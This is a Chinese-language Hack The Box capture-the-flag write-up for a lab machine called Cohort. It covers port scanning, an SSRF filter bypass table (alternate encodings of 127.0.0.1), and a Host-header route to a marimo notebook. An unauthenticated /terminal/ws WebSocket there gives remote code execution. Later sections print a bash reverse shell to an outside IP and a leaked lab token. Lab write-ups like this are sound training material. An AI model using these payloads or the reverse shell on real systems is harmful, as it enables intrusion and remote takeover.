# HTB Season11 Cohort

## 信息收集

### 端口扫描

```bash
nmap -p- --min-rate 1000 -T4 attack_ip
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 09:59 +0800
Nmap scan report for attack_ip
Host is up (7.9s latency).
Not shown: 64237 filtered tcp ports (no-response), 1295 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 294.18 seconds
```

#### 详细端口扫描

```bash
nmap -p 22,80,443 --min-rate 1000 -T4 attack_ip -sCV
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 10:12 +0800
Nmap scan report for attack_ip
Host is up (0.48s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.39 seconds
```

## 攻击路径

```
SSRF → /status内部拓扑泄露 → marimo 8888 (CVE-2026-39987) → RCE → 权限提升
```

### 1. SSRF — POST /api/validate

**触发点**：marketing 首页(`https://cohort.htb/`)的 Client Insights portal(`/portal.html`)加载 `/assets/app.js`(AES 加密混淆,可解出明文)。表单 "Source URL" → `POST /api/validate`,服务端代为抓取 URL,回显 `fetched_status / content_type / preview`。

```bash
curl -sk -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" \
  --data '{"url":"http://127.1/","format":"csv"}'
# → {"ok":true,"fetched_status":200,...}
```

**过滤与绕过**（源码根因：`BLOCKED_HOSTS` 只做字面量比对,不解析最终 IP）：

| Payload | 结果 | 说明 |
|---|---|---|
| `http://127.0.0.1/` `http://localhost/` `http://[::1]/` | 拒绝 | 命中黑名单 |
| `http://127.1/` | **成功** | 短写法绕过 |
| `http://2130706433/` `http://0x7f000001/` `http://0177.0.0.1/` | **成功** | 十进制/十六进制/八进制 |
| `http://0.0.0.0/` | **成功** | 等价回环 |
| `http://attack_ip/` | **成功** | RFC1918 私网未过滤 |
| `file://` `gopher://` `dict://` | 拒绝 | 协议白名单(仅 http/https) |

<img src="SSRF.png" alt="SSRF" width="600" />

### 2. 内网拓扑泄露 — GET http://127.1/status

nginx 按 Host 区分 server block：SSRF 访问 `http://127.1/status`(Host=`127.1`)命中内部状态页；外部 `Host: cohort.htb` 访问 `/status` 返回 403。

```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[
  {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
  {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
  {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888",
   "note":"internal analyst workspace, not for external use"}
]}
```

### 3. 127.0.0.1:5000 — cohort-insights API 指纹

nginx `/api/` 前缀代理到 5000,可直接从外部用任意方法探测。

| 探测 | 结果 | 指纹 |
|---|---|---|
| `GET /api/<path>/health` | 200 `{"ok":true,"service":"cohort-insights"}` | 路由模板 `/<path>/health` |
| `POST /api/<path>/validate` | 200 "Enter a source URL to validate." | 路由模板 `/<path>/validate` |
| 其他 GET | 405 自定义 JSON | 应用自写 handler |
| 其他 POST | 404 `{"ok":false,"message":"Not found."}` | 同上 |
| PUT/DELETE/PATCH/OPTIONS/HEAD | **501 + `Error code: 501` HTML** | **Python `http.server` 默认 `send_error`** |

源码确认(`/opt/cohort-insights/insights_api.py`)：`socketserver.ThreadingMixIn + TCPServer + BaseHTTPRequestHandler` 子类,`LISTEN_HOST="127.0.0.1"`、`server_version="CohortInsights"`、路由按 `path.endswith()` 分发、`urlopen` 不校验 TLS。

### 4. 127.0.0.1:8888 — marimo 0.20.4 (CVE-2026-39987)

- 8888 = **marimo**(Python 响应式笔记本,FastAPI 后端),登录页 `POST /auth/login`(Access Token / Password),回环绑定 + token 认证
- **Host 头注入**直达 marimo(nginx 对 `nb-*.cohort.htb` vhost 代理到 8888)：

```bash
curl -sk -H "Host: nb-1be3782a8afd3ad5.cohort.htb" https://cohort.htb/health
# → {"status":"healthy"}
```

- **CVE-2026-39987**(marimo ≤0.20.4, CVSS 9.3)：`/terminal/ws` WebSocket 端点遗漏认证检查,直接 spawn PTY shell；主 WebSocket `/ws` 正常返回 403,仅 `/terminal/ws` 漏掉：

```bash
curl -sk -i -H "Host: nb-1be3782a8afd3ad5.cohort.htb" -H "Connection: Upgrade" \
     -H "Upgrade: websocket" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     -H "Sec-WebSocket-Version: 13" https://cohort.htb/terminal/ws
# HTTP/1.1 101 Switching Protocols → marimo@cohort:~$
```

用 Python 标准库手写 WebSocket 客户端(握手 + 掩码帧 + `\r` 结尾)执行命令：

```bash
python .\marimo_shell.py  

id && whoami && hostname && uname -a
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo
cohort
Linux cohort 6.8.0-136-generic \#136-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 21:53:05 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

- **附带泄露**：`/etc/systemd/system/marimo.service` 启动参数含明文 token：

```bash
marimo edit /home/marimo/notebooks/retention.py --headless --host 127.0.0.1 -p 8888 \
  --token --token-password YKQ6iPyO5kusNx0BpVAPfjP5 --skip-update-check --no-sandbox
```

笔记本身标注 `__generated_with = "0.20.4"`(恰在 CVE 影响线内)。

```bash
cat /home/marimo/notebooks/retention.py
```

getshell

```bash
python .\marimo_rce.py
#反弹 shell
setsid bash -i >& /dev/tcp/10.10.17.212/8888 0>&1 &
#获取tty shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

### 关键凭证 / 信息

| 类型 | 值 |
|---|---|
| marimo token | `YKQ6iPyO5kusNx0BpVAPfjP5` |
| 内部服务 | 5000=insights-api(Python http.server), 8888=marimo 0.20.4 |
| 用户 | `marimo`(1000, RCE), `insights`(996, 跑 5000 服务) |
| 监控 | `/opt/sysinternalsEBPF`, `/opt/sysmon`(root:700) |

### 权限提升

待更新